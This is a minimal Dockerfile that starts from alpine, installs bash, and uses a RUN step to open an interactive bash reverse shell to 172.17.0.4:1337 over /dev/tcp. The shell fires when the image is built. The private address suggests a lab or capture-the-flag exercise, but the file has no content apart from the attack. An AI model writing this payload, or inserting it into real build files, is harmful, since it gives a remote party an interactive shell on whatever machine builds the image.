FROM alpine
RUN apk update && apk add bash
RUN /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.4/1337 0>&1'
